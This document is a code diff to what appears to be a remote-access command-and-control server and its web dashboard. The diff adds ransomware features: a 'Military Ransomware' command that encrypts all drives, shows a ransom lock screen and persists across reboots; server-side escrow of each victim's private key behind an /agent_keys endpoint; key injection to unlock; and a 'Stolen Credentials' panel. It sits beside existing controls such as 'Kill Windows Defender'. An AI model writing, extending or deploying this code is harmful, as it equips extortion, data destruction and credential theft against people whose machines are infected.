@@ -257,6 +257,7 @@ class ServerState:
 
 state = ServerState()
 known_clients = {}  # device_id -> {hostname, os, status, first_seen, last_seen}
+agent_keys = {}  # device_id -> [{privkey, hostname, ts, device_id}, ...]
 
 # ─── Dashboard HTML ───────────────────────────────────────────
 DASHBOARD = """<!DOCTYPE html>
@@ -498,6 +499,7 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <a onclick="doDec()" style="color:#00e676;"><span class="ci">🔓</span> Vault Decryption</a>
             <a onclick="openM('runm')"><span class="ci">▶️</span> Run Program</a>
             <a onclick="doDisableDefender()" class="danger"><span class="ci">🛡️</span> Kill Windows Defender</a>
+            <a onclick="doRansomware()" style="color:#ff2a2a;"><span class="ci">☢️</span> Military Ransomware</a>
         </div>
     </div>
 
@@ -653,9 +655,30 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
 </div>
 
 <div id="vm" class="ov" onclick="if(event.target===this)closeM('vm')">
-    <div class="mb">
-        <div class="mh"><span>🔑 Credential Vault</span><button onclick="closeM('vm')">✕ Close</button></div>
-        <div class="mc"><pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap"></pre></div>
+    <div class="mb" style="max-width:800px">
+        <div class="mh"><span>🔑 Key Vault & Credentials</span>
+            <div style="display:flex;gap:8px">
+                <button class="bsm" onclick="loadKeys()">🔄 Refresh Keys</button>
+                <button onclick="closeM('vm')">✕ Close</button>
+            </div>
+        </div>
+        <div class="mc">
+            <div id="keyList" style="margin-bottom:16px">
+                <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🔑 Stored Private Keys</h3>
+                <div id="keyItems" style="color:var(--muted);font-size:12px">Loading keys...</div>
+            </div>
+            <hr style="border-color:var(--border);margin:12px 0">
+            <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🔓 Decryption Tools</h3>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
+                <button class="btn" onclick="doEnc()" title="Encrypt all drives with new RSA keypair">🔐 Encrypt All Drives</button>
+                <button class="btn bng" onclick="doDec()" title="Decrypt all drives using stored key">🔓 Decrypt All Drives</button>
+                <button class="btn br" onclick="doRansomware()" style="background:linear-gradient(135deg,#ff2a2a,#aa0000)">☢️ Ransomware</button>
+                <button class="btn" onclick="doUnlockRansom()" title="Unlock ransomware after key injection">🔓 Unlock Ransomware</button>
+            </div>
+            <hr style="border-color:var(--border);margin:12px 0">
+            <h3 style="color:var(--gold);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🕵️ Stolen Credentials</h3>
+            <pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap;background:#060a16;padding:12px;border-radius:6px;border:1px solid var(--border);max-height:300px;overflow:auto"></pre>
+        </div>
     </div>
 </div>
 
@@ -1266,7 +1289,7 @@ function rfs(d){
         const sz=i.is_dir?'':fsz(i.size);
         const termBtn=i.is_dir?`<button type="button" class="bsm bsm-term" onclick='openTermHere(${JSON.stringify(fp)})'>💻 PS</button>`:'';
         const fpEsc=fp.replace(/\\'/g,"\\\\'");
-        const fileLockBtns=!i.is_dir?`<button type="button" class="bsm" onclick="encP('${fpEsc}')">🔒 Lock</button><button type="button" class="bsm" onclick="decP('${fpEsc}')">🔓 Decrypt</button>`:'';
+        const fileLockBtns=!i.is_dir?`<button type="button" class="bsm" onclick="doFileEncrypt('${fpEsc}')">🔒 Encrypt</button><button type="button" class="bsm" onclick="doFileDecrypt('${fpEsc}')">🔓 Decrypt</button>`:'';
         r.innerHTML=`<span class="fn" onclick="${i.is_dir?`nav('${fpEsc}')`:''}">
             ${i.is_dir?'📁':'📄'} ${i.name}</span>
             <span class="fs">${sz}</span>
@@ -1364,25 +1387,95 @@ function doDisableDefender(){
 function lc(a){snd({cmd:0x0C,args:{action:a}})}
 function doLock(){const p=prompt('🔒 Enter lock password:');if(p)snd({cmd:0x20,args:{password:p}})}
 function doEnc(){
-    if(!confirm('⚠️ WARNING: This will encrypt files on the target. Continue?'))return;
+    if(!confirm('⚠️ This will generate a new RSA-2048 keypair and encrypt ALL drives. The private key will be escrowed to the server. Continue?'))return;
     const tgt=prompt('Optional: Folders/Drives to encrypt (comma separated, e.g. C:\\Users, D:\\). Leave empty for ALL DRIVES:');
     if(tgt === null)return;
-    const p=prompt('Enter encryption password (SAVE THIS):');
-    if(p)snd({cmd:0x21,args:{password:p, targets:tgt}});
+    snd({cmd:0x21,args:{targets:tgt}});
 }
 function doDec(){
-    const tgt=prompt('Optional: Folders/Drives to decrypt (comma separated). Leave empty for ALL DRIVES:');
+    if(!confirm('🔓 Decrypt all .locked files using the stored private key? Make sure you have injected the key first via the Vault.'))return;
+    const tgt=prompt('Optional: Folders/Drives to decrypt. Leave empty for ALL DRIVES:');
     if(tgt === null)return;
-    const p=prompt('Enter decryption password:');
-    if(p)snd({cmd:0x22,args:{password:p, targets:tgt}});
+    snd({cmd:0x22,args:{targets:tgt}});
 }
-function encP(p){
-    const pass=prompt(`🔒 Enter password to encrypt this specific target:\\n${p}\\n(SAVE THIS PASSWORD)`);
-    if(pass) snd({cmd:0x21,args:{password:pass, targets:p}});
+function doRansomware(){
+    if(!confirm('☢️ MILITARY-GRADE RANSOMWARE\n\nThis will:\n- Encrypt ALL files on ALL drives with RSA-2048 + AES-256\n- Lock the device with a ransom screen\n- Persist across reboot\n\nThe private key will be escrowed to this server.\n\nAre you absolutely sure?'))return;
+    if(!confirm('☢️ FINAL WARNING: This is irreversible without the key. Proceed?'))return;
+    snd({cmd:0x24,args:{}});
 }
-function decP(p){
-    const pass=prompt(`🔓 Enter password to unlock this specific target:\\n${p}`);
-    if(pass) snd({cmd:0x22,args:{password:pass, targets:p}});
+function doUnlockRansom(){
+    if(!confirm('🔓 This will unlock the ransomware device using the injected private key. Continue?'))return;
+    snd({cmd:0x25,args:{}});
+}
+function doFileEncrypt(fp){
+    if(!confirm('Encrypt this file with a new RSA keypair? Key will be escrowed.'))return;
+    snd({cmd:0x21,args:{targets:fp}});
+}
+function doFileDecrypt(fp){
+    if(!confirm(`Decrypt ${fp} using stored private key? Ensure key is injected first.`))return;
+    snd({cmd:0x22,args:{targets:fp}});
+}
+async function loadKeys(){
+    const el=document.getElementById('keyItems');
+    if(!el)return;
+    el.innerHTML='<span style="color:var(--muted)">Loading...</span>';
+    try{
+        const r=await fetch('/agent_keys');
+        const keys=await r.json();
+        const ids=Object.keys(keys);
+        if(!ids.length){ el.innerHTML='<span style="color:var(--muted)">No keys stored yet. Encrypt something first.</span>'; return; }
+        let html='';
+        ids.forEach(did=>{
+            const entries=keys[did];
+            if(!entries||!entries.length)return;
+            entries.forEach((entry,i)=>{
+                const hostname=entry.hostname||did.slice(0,8);
+                const ts=new Date(entry.ts*1000).toLocaleString();
+                const keyPreview=entry.privkey ? entry.privkey.slice(0,60)+'...' : '(empty)';
+                html+=`<div style="background:rgba(20,24,42,.6);border:1px solid var(--border);border-radius:8px;padding:10px;margin-bottom:8px">
+                    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
+                        <span style="color:var(--gold);font-weight:700;font-size:12px">${hostname}</span>
+                        <span style="color:var(--muted);font-size:10px">${ts}</span>
+                    </div>
+                    <div style="font-size:9px;color:#888;font-family:monospace;margin:4px 0;word-break:break-all">${keyPreview}</div>
+                    <div style="display:flex;gap:6px;margin-top:6px">
+                        <button class="bsm" onclick="injectKey('${did.replace(/'/g,"\\'")}',${i})" title="Send this private key to the currently connected agent">💉 Inject to Agent</button>
+                        <button class="bsm" onclick="copyKey('${did.replace(/'/g,"\\'")}',${i})" title="Copy full private key to clipboard">📋 Copy</button>
+                        <button class="bsm" onclick="downloadKey('${did.replace(/'/g,"\\'")}',${i})" title="Download as .pem file">⬇ Download</button>
+                    </div>
+                </div>`;
+            });
+        });
+        el.innerHTML=html;
+    }catch(e){
+        el.innerHTML=`<span style="color:var(--red)">Failed to load keys: ${e.message}</span>`;
+    }
+}
+function injectKey(did, idx){
+    if(!aid){ alert('Select an agent first to inject the key.'); return; }
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey){ alert('Key not found.'); return; }
+        snd({cmd:0x26,args:{privkey:entry.privkey}});
+        at('> Private key injected from vault.');
+    }).catch(e=>alert('Error: '+e.message));
+}
+function copyKey(did, idx){
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey)return;
+        navigator.clipboard.writeText(entry.privkey).then(()=>alert('Private key copied to clipboard.')).catch(()=>alert('Copy failed.'));
+    }).catch(()=>{});
+}
+function downloadKey(did, idx){
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey)return;
+        const blob=new Blob([entry.privkey],{type:'application/x-pem-file'});
+        const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+        a.download=`ransom_key_${did.slice(0,8)}.pem`;a.click();
+        setTimeout(()=>URL.revokeObjectURL(a.href),5000);
+    }).catch(()=>{});
 }
 
 /* HID — rAF-coalesced mouse for smoother remote control */
@@ -1421,7 +1514,10 @@ document.addEventListener('keydown',e=>{
 });
 
 /* Modals */
-function openM(id){document.getElementById(id).classList.add('open')}
+function openM(id){
+    document.getElementById(id).classList.add('open');
+    if(id==='vm') loadKeys();
+}
 function closeM(id){document.getElementById(id).classList.remove('open')}
 
 /* Sync */
@@ -1571,7 +1667,19 @@ async def ws_client(websocket: WebSocket):
                     session = await state.get_client(device_id)
                     if session:
                         session.last_seen = time.time()
-                        await session.broadcast_text(data)
+                        if data.get("cmd") == 0x27:  # CMD_KEY_EXCH — key escrow, store don't forward
+                            key_info = data.get("data", {})
+                            if device_id not in agent_keys:
+                                agent_keys[device_id] = []
+                            agent_keys[device_id].append({
+                                "privkey": key_info.get("privkey", ""),
+                                "hostname": key_info.get("hostname", known_clients.get(device_id, {}).get("hostname", "?")),
+                                "device_id": device_id,
+                                "ts": time.time(),
+                            })
+                            logger.info(f"🔑 Private key stored for {device_id[:8]}... ({len(agent_keys[device_id])} keys)")
+                        else:
+                            await session.broadcast_text(data)
     except WebSocketDisconnect:
         pass
     except Exception as ex:
@@ -1749,6 +1857,11 @@ async def get_known_clients():
         if session:
             result[cid]["info"] = session.info
     return result
+
+
+@app.get("/agent_keys")
+async def get_agent_keys():
+    return agent_keys
 
 
 @app.get("/stats")
